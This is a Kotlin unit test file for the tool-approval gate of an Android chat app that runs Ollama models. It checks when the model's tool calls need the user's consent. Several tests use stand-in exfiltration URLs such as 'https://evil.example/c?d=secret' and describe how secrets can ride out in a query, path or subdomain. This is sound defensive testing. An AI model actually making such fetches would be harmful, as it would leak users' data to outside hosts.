package com.trucdecomptable.ollamachat

import com.trucdecomptable.ollamachat.data.tools.ToolExecutor
import com.trucdecomptable.ollamachat.data.tools.ToolPolicy
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * The gate decides what runs unattended. Its failure mode is silent, so each
 * rule is pinned here — above all the ones that must answer "ask".
 */
class ToolPolicyTest {

    private val servers = listOf("fichiers", "courriel")

    private fun needs(
        tool: String,
        args: String = "{}",
        allowed: Set<String> = emptySet(),
        trusted: Set<String> = emptySet(),
        gate: Boolean = true,
    ) = ToolPolicy.needsApproval(tool, args, servers, gate, allowed, trusted)

    private fun url(u: String) = """{"url":"$u"}"""

    @Test
    fun `tools that stay on the phone never interrupt`() {
        listOf("get_current_time", "calculate").forEach { tool ->
            assertEquals(tool, ToolPolicy.Tier.READ, ToolPolicy.tierOf(tool, servers))
            assertFalse(tool, needs(tool))
        }
    }

    @Test
    fun `search and weather reach fixed services and do not interrupt`() {
        listOf("web_search", "get_weather").forEach { tool ->
            assertEquals(tool, ToolPolicy.Tier.THIRD_PARTY, ToolPolicy.tierOf(tool, servers))
            assertFalse(tool, needs(tool))
        }
    }

    @Test
    fun `fetch_url asks for an address the model wrote`() {
        // The exfiltration channel: data riding in an address nobody typed.
        assertEquals(ToolPolicy.Tier.NETWORK, ToolPolicy.tierOf("fetch_url", servers))
        assertTrue(needs("fetch_url", url("https://evil.example/c?d=secret")))
    }

    @Test
    fun `fetch_url runs unasked on an address that existed before`() {
        val trusted = ToolPolicy.extractUrls("Lis https://www.legifrance.gouv.fr/loda/id/LEGIARTI0001 stp.")
        assertFalse(needs("fetch_url", url("https://www.legifrance.gouv.fr/loda/id/LEGIARTI0001"), trusted = trusted))
    }

    @Test
    fun `a trusted domain is not a trusted address`() {
        val trusted = setOf("https://site.example/page")
        // Data can ride in the query, the path or a subdomain.
        assertTrue(needs("fetch_url", url("https://site.example/page?d=secret"), trusted = trusted))
        assertTrue(needs("fetch_url", url("https://site.example/page/secret"), trusted = trusted))
        assertTrue(needs("fetch_url", url("https://secret.site.example/page"), trusted = trusted))
    }

    @Test
    fun `fetch_url can never be allowed for good`() {
        assertTrue(needs("fetch_url", url("https://x.example/"), allowed = setOf("fetch_url")))
        assertFalse(ToolPolicy.canAlwaysAllow("fetch_url", servers))
    }

    @Test
    fun `fetch_url without a readable address asks`() {
        assertTrue(needs("fetch_url", "{}"))
        assertTrue(needs("fetch_url", "not json"))
    }

    @Test
    fun `an mcp tool is external whatever it is called`() {
        // Reassuring names are exactly what a gate must not fall for.
        assertEquals(ToolPolicy.Tier.EXTERNAL, ToolPolicy.tierOf("fichiers_lire", servers))
        assertEquals(ToolPolicy.Tier.EXTERNAL, ToolPolicy.tierOf("fichiers_supprimer", servers))
        assertTrue(needs("fichiers_lire"))
        assertTrue(ToolPolicy.canAlwaysAllow("fichiers_lire", servers))
    }

    @Test
    fun `an unrecognised name is treated as external, not as safe`() {
        assertEquals(ToolPolicy.Tier.EXTERNAL, ToolPolicy.tierOf("inconnu", servers))
        assertTrue(needs("inconnu"))
        // A name that merely looks like one of ours is still not one of ours.
        assertTrue(needs("web_search_v2"))
    }

    @Test
    fun `save_memory writes but is not gated`() {
        assertEquals(ToolPolicy.Tier.LOCAL_WRITE, ToolPolicy.tierOf("save_memory", servers))
        assertFalse(needs("save_memory"))
    }

    @Test
    fun `an allowed mcp tool stops asking, its neighbours do not`() {
        assertFalse(needs("fichiers_lire", allowed = setOf("fichiers_lire")))
        assertTrue(needs("fichiers_supprimer", allowed = setOf("fichiers_lire")))
    }

    @Test
    fun `turning the gate off asks for nothing`() {
        assertFalse(needs("fichiers_supprimer", gate = false))
        assertFalse(needs("fetch_url", url("https://evil.example/c?d=x"), gate = false))
    }

    @Test
    fun `the longest server name wins`() {
        // "a" must not capture the tools of "a_b".
        assertEquals("a_b", ToolPolicy.serverOf("a_b_lire", listOf("a", "a_b")))
        assertEquals("a", ToolPolicy.serverOf("a_lire", listOf("a", "a_b")))
        assertEquals("courriel", ToolPolicy.serverOf("courriel_envoyer", servers))
        assertNull(ToolPolicy.serverOf("web_search", servers))
    }

    @Test
    fun `every native tool is classified`() {
        // A tool added to the executor without a tier would land in EXTERNAL
        // and ask for approval on every call; this makes the omission loud.
        ToolExecutor.nativeToolDefs.forEach { def ->
            assertTrue(def.name, def.name in ToolPolicy.NATIVE)
            assertNotEquals(def.name, ToolPolicy.Tier.EXTERNAL, ToolPolicy.tierOf(def.name, emptyList()))
        }
    }

    @Test
    fun `addresses are compared whole, minus the punctuation of a sentence`() {
        assertEquals(
            setOf("https://a.example/x", "https://b.example/y", "https://c.example/z"),
            ToolPolicy.extractUrls("Voir https://a.example/x. Et https://b.example/y/, puis (https://c.example/z)"),
        )
        assertEquals("https://a.example/x", ToolPolicy.normalizeUrl(" https://a.example/x/ "))
    }

    @Test
    fun `the url argument is read from the call`() {
        assertEquals("https://a.example/x", ToolPolicy.urlArgument(url("https://a.example/x")))
        assertNull(ToolPolicy.urlArgument("{}"))
        assertNull(ToolPolicy.urlArgument("garbage"))
    }
}
